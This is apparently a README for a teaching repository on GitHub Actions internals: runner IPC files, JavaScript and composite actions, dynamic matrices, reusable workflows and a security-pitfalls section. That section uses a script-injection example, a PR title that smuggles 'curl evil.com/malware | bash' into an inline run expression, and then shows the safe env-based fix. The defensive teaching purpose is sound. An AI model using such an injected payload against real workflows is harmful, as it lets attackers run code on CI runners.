# runner-actions

A hands-on lab for learning GitHub Actions internals from the ground up. Every action and workflow in this repo is built to teach a specific concept — not just use the API, but understand what the runner is actually doing.

---

## Table of Contents

1. [How the Runner Works](#1-how-the-runner-works)
2. [File-Based IPC: The Runner's Communication Channels](#2-file-based-ipc-the-runners-communication-channels)
3. [Action Types](#3-action-types)
4. [Action 1: runner-inspect](#4-action-1-runner-inspect)
5. [Action 2: workflow-telemetry](#5-action-2-workflow-telemetry)
6. [Action 3: dynamic-matrix](#6-action-3-dynamic-matrix)
7. [Action 4: job-summary (Composite)](#7-action-4-job-summary-composite)
8. [Reusable Workflows](#8-reusable-workflows)
9. [The @actions Toolkit](#9-the-actions-toolkit)
10. [Bundling with ncc](#10-bundling-with-ncc)
11. [Security Pitfalls](#11-security-pitfalls)
12. [Repo Structure](#12-repo-structure)

---

## 1. How the Runner Works

When you push code or open a PR, GitHub's job scheduler picks up any triggered workflows and sends a job assignment to a runner machine. Here's what happens in sequence:

```
GitHub Job Scheduler
  └─ Assigns job to a runner (hosted or self-hosted)
       └─ Runner binary picks up the job
            └─ Checks out code into GITHUB_WORKSPACE
            └─ Processes each step in order:
                 - `uses:` steps: downloads or finds the action, spawns a Node process
                 - `run:` steps: spawns a shell (bash/pwsh/cmd) and executes the script
            └─ Uploads logs, artifacts, outputs back to GitHub
```

**Key insight:** The runner is a binary (`actions/runner` on GitHub) that runs on the machine. It polls GitHub's API for job assignments. When it gets one, it forks child processes — one per step. Those child processes are isolated: they don't share memory, but they share the filesystem and communicate through special files (see section 2).

**Hosted runners** are ephemeral VMs. Every job gets a fresh VM. Nothing persists between jobs except artifacts you explicitly upload and cache entries. The `/home/runner` directory you see in logs is wiped after the job.

---

## 2. File-Based IPC: The Runner's Communication Channels

The runner uses **files** — not environment variables — as the IPC mechanism between steps and jobs. GitHub sets each of these to a file path; the runner then reads them after each step completes.

| Variable | Purpose | How to write |
|---|---|---|
| `GITHUB_OUTPUT` | Set step outputs | `echo "key=value" >> "$GITHUB_OUTPUT"` |
| `GITHUB_ENV` | Set env vars for later steps | `echo "MY_VAR=value" >> "$GITHUB_ENV"` |
| `GITHUB_PATH` | Prepend to `PATH` for later steps | `echo "/my/bin" >> "$GITHUB_PATH"` |
| `GITHUB_STEP_SUMMARY` | Append markdown to job summary UI | `echo "## Done" >> "$GITHUB_STEP_SUMMARY"` |
| `GITHUB_STATE` | Pass data from `pre` to `post` | `echo "key=value" >> "$GITHUB_STATE"` |

**Why files and not environment variables?** Because each step runs in its own child process. Child processes can't mutate the parent's environment. Files are the only way to communicate upward.

The `@actions/core` toolkit wraps all of these so you don't have to write file I/O manually:

```js
core.setOutput('key', 'value')      // writes to GITHUB_OUTPUT
core.exportVariable('KEY', 'value') // writes to GITHUB_ENV
core.addPath('/my/bin')             // writes to GITHUB_PATH
core.saveState('key', 'value')      // writes to GITHUB_STATE
core.getState('key')                // reads from GITHUB_STATE
await core.summary.addHeading('Title', 1).write() // writes to GITHUB_STEP_SUMMARY
```

**Important:** Writing to `GITHUB_ENV` only affects steps that run *after* the current step. The current step cannot read its own `GITHUB_ENV` writes.

---

## 3. Action Types

GitHub Actions supports three types of actions. Each has a different execution model.

### JavaScript Actions (`using: node20`)

The runner spawns a Node.js process pointing at your `main` file. No install happens — whatever is in git is what runs. This means you must either commit `node_modules/` or bundle your code (see [Bundling with ncc](#10-bundling-with-ncc)).

```yaml
runs:
  using: node20
  pre: dist/pre/index.js    # optional: runs before all steps
  main: dist/index.js       # required
  post: dist/post/index.js  # optional: runs after all steps
  post-if: always()         # run post even if the job fails
```

The `pre`/`main`/`post` scripts each run as **separate Node processes**. They don't share memory. The only IPC between them is `core.saveState` / `core.getState` via `GITHUB_STATE`.

### Composite Actions (`using: composite`)

No separate process — the runner executes the listed steps inline inside the calling job. Think of it as a macro that expands into steps.

```yaml
runs:
  using: composite
  steps:
    - name: Some step
      shell: bash          # REQUIRED on every run step — no default
      run: echo "hello"
    - name: Use another action
      uses: ./actions/runner-inspect
```

Key differences from JS actions:
- No `pre`/`post` lifecycle
- Every `run:` step **must** have `shell:` (there is no default)
- Outputs use `value:` with an expression, not `core.setOutput()`
- Local actions are referenced relative to the **repo root**, not relative to the composite action's directory

### Docker Actions (`using: docker`)

Runs inside a Docker container. Not covered in this repo, but the pattern is: the runner pulls the image, starts a container, and your entrypoint script runs inside it.

---

## 4. Action 1: `runner-inspect`

**Location:** [`actions/runner-inspect/`](actions/runner-inspect/)  
**Workflow:** [`.github/workflows/test-runner-inspect.yml`](.github/workflows/test-runner-inspect.yml)

### What it teaches

This action does a deep inspection of the runner environment and reports what it finds. Running it across Ubuntu, macOS, and Windows reveals how different hosted runners actually are.

### Concepts

#### GITHUB_* and RUNNER_* Environment Variables

The runner injects dozens of variables before your job starts. They fall into categories:

| Prefix | What it contains | Examples |
|---|---|---|
| `GITHUB_*` | Workflow and event context | `GITHUB_SHA`, `GITHUB_REF`, `GITHUB_WORKFLOW`, `GITHUB_EVENT_NAME` |
| `RUNNER_*` | Machine info | `RUNNER_OS`, `RUNNER_ARCH`, `RUNNER_NAME`, `RUNNER_TOOL_CACHE` |
| File sinks | Paths to IPC files | `GITHUB_OUTPUT`, `GITHUB_ENV`, `GITHUB_STATE`, `GITHUB_STEP_SUMMARY` |

#### Key Filesystem Paths

| Variable | Path (Linux) | Purpose |
|---|---|---|
| `GITHUB_WORKSPACE` | `/home/runner/work/<repo>/<repo>` | Where `actions/checkout` puts your code |
| `RUNNER_TOOL_CACHE` | `/opt/hostedtoolcache` | Pre-installed tools (Node, Python, etc.) |
| `RUNNER_TEMP` | `/home/runner/work/_temp` | Scratch space, cleaned between jobs |
| `RUNNER_WORKSPACE` | `/home/runner/work/<repo>` | Parent of GITHUB_WORKSPACE |
| `GITHUB_ACTION_PATH` | varies | Directory of the currently-executing action |

#### `core.group()` for collapsible log sections

```js
await core.group('Section Name', async () => {
  core.info('This appears inside the collapsed section in the UI')
})
```

#### `exec.getExecOutput()` to capture command output

```js
const result = await exec.getExecOutput('node', ['--version'], {
  silent: true,          // don't print to log
  ignoreReturnCode: true // don't throw on non-zero exit
})
const version = result.stdout.trim() // "v20.11.0"
```

Compare this with `exec.exec()` which prints output to the log but doesn't capture it.

#### `core.summary` — rich markdown in the job summary UI

```js
await core.summary
  .addHeading('Report', 1)
  .addTable([
    [{ data: 'Key', header: true }, { data: 'Value', header: true }],
    ['OS', 'Linux'],
    ['Arch', 'X64'],
  ])
  .addCodeBlock(JSON.stringify(data, null, 2), 'json')
  .write()
```

The `write()` call flushes the content to `GITHUB_STEP_SUMMARY`. The summary appears in the Actions UI under the job.

#### `@actions/artifact` v1 API

```js
const client = artifact.create()
await client.uploadArtifact(
  'artifact-name',
  ['/path/to/file.json'],
  process.env.GITHUB_WORKSPACE   // root dir — artifacts preserve relative paths from here
)
```

Artifacts are stored per workflow run. They can be downloaded from the Actions UI or via the REST API. They are **not** shared between runs (unlike cache).

### Outputs

| Output | Description |
|---|---|
| `runner-os` | `Linux`, `Windows`, or `macOS` |
| `runner-arch` | `X64` or `ARM64` |
| `tool-versions` | JSON string: `{"node":"v20.x","git":"2.x",...}` |
| `report-path` | Path to JSON report (only set when `upload-artifact: true`) |

### The matrix lesson in the workflow

`test-runner-inspect.yml` runs the same job across three runners simultaneously:

```yaml
strategy:
  fail-fast: false
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
runs-on: ${{ matrix.os }}
```

`fail-fast: false` means all three run to completion even if one fails. The default (`true`) would cancel the other two on the first failure.

---

## 5. Action 2: `workflow-telemetry`

**Location:** [`actions/workflow-telemetry/`](actions/workflow-telemetry/)  
**Workflow:** [`.github/workflows/test-workflow-telemetry.yml`](.github/workflows/test-workflow-telemetry.yml)

### What it teaches

The pre/post lifecycle, cross-process state, Octokit, and how to post PR comments.

### The pre/post lifecycle

When an action declares `pre:` and `post:`, the runner's execution order is:

```
Job starts
  └─ pre.js runs                 ← records start time
  └─ Step 1 (Checkout)
  └─ Step 2 (Start telemetry)    ← main.js runs here (no-op for us)
  └─ Step 3 (Simulate build)
  └─ Step 4 (Final step)
  └─ post.js runs                ← computes duration, posts results
Job ends
```

The `pre` script runs **before the first step**. The `post` script runs **after all steps**, even if the job failed (because of `post-if: always()`).

### `core.saveState` / `core.getState`

Each of `pre`, `main`, and `post` is a **separate Node process**. They cannot communicate through variables. The only bridge is `GITHUB_STATE`:

```js
// pre.js
core.saveState('start_ms', String(Date.now()))
core.saveState('job', process.env.GITHUB_JOB)

// post.js (different process, different PID)
const startMs = parseInt(core.getState('start_ms'))
const job = core.getState('job')
```

Internally, `saveState` writes `key=value\n` to the file at `$GITHUB_STATE`. The runner reads this file after `pre` exits and makes the values available to `post` later. The values are **not** available in `main` — only in `post`.

### `@actions/github` and Octokit

```js
const { context, getOctokit } = require('@actions/github')

const octokit = getOctokit(token)

// context gives you everything about the current event
context.repo       // { owner: 'you', repo: 'runner-actions' }
context.sha        // full commit SHA
context.eventName  // 'pull_request', 'push', 'workflow_dispatch', etc.
context.payload    // full webhook event payload
context.payload.pull_request?.number  // PR number (only on pull_request events)
```

### Upsert comment pattern

Instead of creating a new comment on every push to a PR (which would spam it), we embed a marker string and update if it exists:

```js
const MARKER = '<!-- workflow-telemetry -->'

const { data: comments } = await octokit.rest.issues.listComments({
  owner, repo, issue_number: prNumber
})
const existing = comments.find(c => c.body?.includes(MARKER))

if (existing) {
  await octokit.rest.issues.updateComment({ owner, repo, comment_id: existing.id, body })
} else {
  await octokit.rest.issues.createComment({ owner, repo, issue_number: prNumber, body })
}
```

### `GITHUB_TOKEN` and permissions

`GITHUB_TOKEN` is automatically created by GitHub for every job. It expires when the job ends. Its permissions are controlled by the `permissions:` block:

```yaml
permissions:
  contents: read        # read repo files
  pull-requests: write  # create/update PR comments
```

Without `pull-requests: write`, the Octokit `createComment` call returns a 403.

**Security note:** The `secrets` context is blocked inside `if:` expressions — you cannot write `if: secrets.MY_TOKEN != ''`. The reason is to prevent side-channel attacks where an attacker could infer a secret's value by observing which steps ran. Always guard secrets inside the `run:` script via `env:`:

```yaml
- name: Deploy
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: |
    if [ -z "$DEPLOY_TOKEN" ]; then
      echo "No token, skipping"
      exit 0
    fi
    # use $DEPLOY_TOKEN here
```

---

## 6. Action 3: `dynamic-matrix`

**Location:** [`actions/dynamic-matrix/`](actions/dynamic-matrix/)  
**Workflow:** [`.github/workflows/test-dynamic-matrix.yml`](.github/workflows/test-dynamic-matrix.yml)

### What it teaches

How the matrix strategy works internally, why dynamic matrices require two jobs, and the `include`/`exclude` mechanics.

### How matrix expansion works

The runner expands the matrix **before any job starts** in a single pass. Given:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest]
    node-version: [18, 20, 22]
```

The runner computes the Cartesian product and creates 6 parallel jobs:

```
ubuntu-latest + 18
ubuntu-latest + 20
ubuntu-latest + 22
macos-latest  + 18
macos-latest  + 20
macos-latest  + 22
```

Because expansion happens before any step runs, you **cannot** generate a matrix from a step in the same job. You need two separate jobs.

### The two-job pattern for dynamic matrices

```yaml
jobs:
  generate:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.gen.outputs.matrix }}
    steps:
      - uses: actions/checkout@v4
      - id: gen
        uses: ./actions/dynamic-matrix

  build:
    needs: generate
    strategy:
      matrix: ${{ fromJSON(needs.generate.outputs.matrix) }}
    runs-on: ${{ matrix.os }}
    steps:
      - run: echo "Running on ${{ matrix.os }} with node ${{ matrix.node-version }}"
```

`fromJSON()` is a GitHub Actions expression function that parses a JSON string into an object. The `generate` job must complete before `build` starts — `needs: generate` enforces this ordering.

### `include` and `exclude`

```js
const matrix = {
  os: ['ubuntu-latest', 'macos-latest'],
  'node-version': ['18', '20', '22'],
  include: [
    // Matches an existing combo → adds `experimental: true` to that specific combo
    // Doesn't match → added as a brand new standalone job
    { os: 'ubuntu-latest', 'node-version': '23-nightly', experimental: true }
  ],
  exclude: [
    // Removes this specific combination from the product
    { os: 'windows-latest', 'node-version': '18' }
  ]
}
```

The matrix output must be valid JSON — `fromJSON()` fails silently (returns `null`) on invalid input.

### `continue-on-error` for experimental jobs

```yaml
continue-on-error: ${{ matrix.experimental == true }}
```

If the experimental node@23-nightly job fails, it won't cancel the other matrix jobs. Without this, any failure cancels all remaining jobs (when `fail-fast: true`, which is the default).

---

## 7. Action 4: `job-summary` (Composite)

**Location:** [`actions/job-summary/`](actions/job-summary/)

### What it teaches

Composite action mechanics, output passthrough, and `$GITHUB_ACTION_PATH`.

### Composite action structure

```yaml
runs:
  using: composite
  steps:
    - name: Run a JS action
      id: inspect
      uses: ./actions/runner-inspect    # path relative to REPO ROOT, not this action

    - name: Write to summary
      shell: bash                        # REQUIRED — no default shell in composites
      run: |
        echo "## Done" >> "$GITHUB_STEP_SUMMARY"
```

### Output passthrough with `value:`

Composite actions cannot call `core.setOutput()` — they use `value:` with an expression:

```yaml
outputs:
  runner-os:
    description: Passed through from runner-inspect
    value: ${{ steps.inspect.outputs.runner-os }}
```

The expression `${{ steps.inspect.outputs.runner-os }}` references the `inspect` step's output by its `id`. This is evaluated at expression time by the runner, not in JavaScript.

### `$GITHUB_ACTION_PATH`

Inside a composite action's step, `$GITHUB_ACTION_PATH` points to the composite action's directory on disk, not the calling workflow's workspace. Use it to reference files bundled with the action:

```bash
echo "This action lives at: $GITHUB_ACTION_PATH"
# /home/runner/work/_actions/owner/repo/ref/actions/job-summary
```

---

## 8. Reusable Workflows

**Files:** [`.github/workflows/reusable-ci.yml`](.github/workflows/reusable-ci.yml), [`.github/workflows/caller.yml`](.github/workflows/caller.yml)

### What it teaches

`workflow_call`, typed inputs, declared secrets, workflow-level outputs, and the fan-out pattern.

### How reusable workflows differ from composite actions

| | Composite Action | Reusable Workflow |
|---|---|---|
| Runs on | Same runner as caller | Its own separate runner |
| Trigger | `uses:` in a step | `uses:` in a job |
| Can have matrix | No | Yes |
| Caller can add steps | Yes | No — job is only `uses:` |
| Context bleeding | Limited | `github.actor`, `github.sha` come from caller |

### Declaring a reusable workflow

```yaml
on:
  workflow_call:
    inputs:
      node-version:
        type: string      # string | boolean | number | choice | environment
        required: true
    secrets:
      DEPLOY_TOKEN:
        required: false
    outputs:
      build-id:
        description: Unique build identifier
        value: ${{ jobs.ci.outputs.build-id }}  # must route through a job output
```

Outputs must go through two levels: step output → job output → workflow output. You cannot reference a step output directly at the workflow level.

### Calling a reusable workflow

```yaml
jobs:
  ci-node20:
    uses: ./.github/workflows/reusable-ci.yml     # same repo, same ref
    # uses: owner/repo/.github/workflows/file.yml@ref  # different repo
    with:
      node-version: '20'
    secrets: inherit    # forward all caller secrets, OR list them explicitly
    permissions:
      contents: read
```

**Rules for the calling job:**
- It can only have `uses:`, `with:`, `secrets:`, `permissions:`, and `needs:` — no `steps:`
- `secrets: inherit` passes all secrets from the caller's context
- The caller and callee must be in the same visibility (both public or both private)

### Fan-out pattern

You can call the same reusable workflow multiple times with different inputs — they run in parallel:

```yaml
jobs:
  ci-node20:
    uses: ./.github/workflows/reusable-ci.yml
    with:
      node-version: '20'

  ci-node18:
    uses: ./.github/workflows/reusable-ci.yml
    with:
      node-version: '18'

  aggregate:
    needs: [ci-node20, ci-node18]
    steps:
      - run: |
          echo "node20 build: ${{ needs.ci-node20.outputs.build-id }}"
          echo "node18 build: ${{ needs.ci-node18.outputs.build-id }}"
```

---

## 9. The @actions Toolkit

Quick reference for the toolkit packages used in this repo.

### `@actions/core`

```js
// Inputs and outputs
core.getInput('input-name')              // read action input (always a string)
core.getBooleanInput('flag')             // parses 'true'/'false' to boolean
core.setOutput('key', 'value')           // write to GITHUB_OUTPUT

// Logging
core.info('message')                     // standard log line
core.warning('message')                  // yellow warning annotation
core.error('message')                    // red error annotation
core.setFailed('reason')                 // mark step failed, set exit code 1

// Collapsible sections
await core.group('Name', async () => { ... })
core.startGroup('Name') / core.endGroup()

// State (pre ↔ post IPC via GITHUB_STATE)
core.saveState('key', 'value')
core.getState('key')

// Environment
core.exportVariable('KEY', 'value')      // writes to GITHUB_ENV
core.addPath('/bin/dir')                 // prepends to PATH via GITHUB_PATH

// Summary
core.summary.addHeading('Title', 1)
           .addTable([[{data:'H',header:true}],['row']])
           .addCodeBlock('code', 'js')
           .addRaw('raw markdown')
           .write()
```

### `@actions/exec`

```js
// Run a command (prints to log, throws on non-zero exit)
await exec.exec('npm', ['install'])

// Capture output (doesn't print to log by default)
const { stdout, stderr, exitCode } = await exec.getExecOutput(
  'git', ['--version'],
  { silent: true, ignoreReturnCode: true }
)
```

### `@actions/github`

```js
const { context, getOctokit } = require('@actions/github')

// Context (everything about the current event)
context.repo          // { owner, repo }
context.sha           // full SHA
context.ref           // refs/heads/main
context.eventName     // 'push', 'pull_request', etc.
context.payload       // full webhook payload
context.actor         // username that triggered the run
context.runId         // numeric run ID
context.job           // job name

// Octokit REST client
const octokit = getOctokit(token)
await octokit.rest.issues.createComment({ owner, repo, issue_number, body })
await octokit.rest.issues.listComments({ owner, repo, issue_number })
await octokit.rest.issues.updateComment({ owner, repo, comment_id, body })
```

### `@actions/artifact` (v1)

```js
const artifact = require('@actions/artifact')

const client = artifact.create()

// Upload
await client.uploadArtifact(
  'artifact-name',      // name shown in the UI
  ['/abs/path/file'],   // list of files to upload
  '/root/dir'           // root directory — files are stored relative to this
)

// Download
await client.downloadArtifact('artifact-name', '/dest/dir')
```

---

## 10. Bundling with ncc

JavaScript actions need all their dependencies available on the runner. There are two options:

1. **Commit `node_modules/`** — works but bloats the repo
2. **Bundle with `@vercel/ncc`** — standard approach used by all official GitHub actions

`ncc` uses webpack internally to bundle your entry file and all its dependencies into a single `dist/index.js`. The runner checks out your repo and executes `dist/index.js` directly — no `npm install` ever runs on the runner.

```bash
# Install once at the root
npm install --save-dev @vercel/ncc

# Build a single entry point
npx ncc build src/index.js -o dist --license licenses.txt

# Build multiple entry points (for pre/main/post)
npx ncc build src/pre.js  -o dist/pre  --license licenses.txt
npx ncc build src/main.js -o dist/main --license licenses.txt
npx ncc build src/post.js -o dist/post --license licenses.txt
```

**Important:** The `dist/` directory must be committed to git. The runner has no ability to install dependencies — it only runs what's in the repo. This is why `.gitignore` should **not** include `dist/`.

After any change to `src/`, rebuild and commit:

```bash
npm run build   # runs the build script in package.json
git add dist/
git commit -m "Rebuild dist"
```

---

## 11. Security Pitfalls

### Script injection via inline expressions

**Never** put `${{ }}` expressions inline in `run:` scripts when the value comes from user-controlled input (PR title, branch name, issue body, etc.):

```yaml
# DANGEROUS — if the PR title is: "; curl evil.com/malware | bash; echo "
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

The expression is substituted before the shell parses the script, turning arbitrary text into executable shell code.

**Safe pattern — always use `env:`:**

```yaml
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

The runner substitutes the expression into the env var at the YAML level. The shell then reads `$PR_TITLE` as a variable — the value is never parsed as shell syntax.

This applies to ALL step outputs and external data, not just event payloads.

### Secrets in `if:` expressions

The `secrets` context is blocked in `if:` conditions:

```yaml
# WILL FAIL — "Unrecognized named-value: 'secrets'"
- if: secrets.MY_TOKEN != ''
  run: deploy.sh
```

Guard secrets inside the script instead:

```yaml
- name: Deploy
  env:
    MY_TOKEN: ${{ secrets.MY_TOKEN }}
  run: |
    if [ -z "$MY_TOKEN" ]; then exit 0; fi
    ./deploy.sh
```

### Expression syntax in `action.yml` description fields

GitHub parses `${{ }}` expressions even in `description:` fields of `action.yml`. If you put expression syntax in a description, the workflow will fail with a parse error:

```yaml
# WILL FAIL
outputs:
  matrix:
    description: Use with ${{ fromJSON(steps.x.outputs.matrix) }}
```

Use plain text in description fields.

---

## 12. Repo Structure

```
runner-actions/
├── .github/
│   └── workflows/
│       ├── test-runner-inspect.yml      # Matrix across ubuntu/macos/windows
│       ├── test-workflow-telemetry.yml  # PR-triggered, posts timing comment
│       ├── test-dynamic-matrix.yml      # Two-job dynamic matrix pattern
│       ├── reusable-ci.yml              # workflow_call reusable workflow
│       └── caller.yml                   # Calls reusable-ci.yml twice in parallel
├── actions/
│   ├── runner-inspect/
│   │   ├── action.yml
│   │   ├── src/index.js
│   │   ├── dist/                        # bundled output — committed to git
│   │   └── package.json
│   ├── workflow-telemetry/
│   │   ├── action.yml
│   │   ├── src/
│   │   │   ├── pre.js
│   │   │   ├── main.js
│   │   │   └── post.js
│   │   ├── dist/                        # three separate bundles
│   │   └── package.json
│   ├── dynamic-matrix/
│   │   ├── action.yml
│   │   ├── src/index.js
│   │   ├── dist/
│   │   └── package.json
│   └── job-summary/
│       └── action.yml                   # composite — no dist needed
└── package.json                         # npm workspaces root
```

---

## Triggering the workflows

| Workflow | Trigger |
|---|---|
| `test-runner-inspect` | Push to `actions/runner-inspect/**` or the workflow file, or manual dispatch |
| `test-workflow-telemetry` | Open or push to a PR touching `actions/workflow-telemetry/**` |
| `test-dynamic-matrix` | Push to `actions/dynamic-matrix/**` or the workflow file, or manual dispatch |
| `caller` | Push to `actions/**`, `caller.yml`, or `reusable-ci.yml`, or manual dispatch |
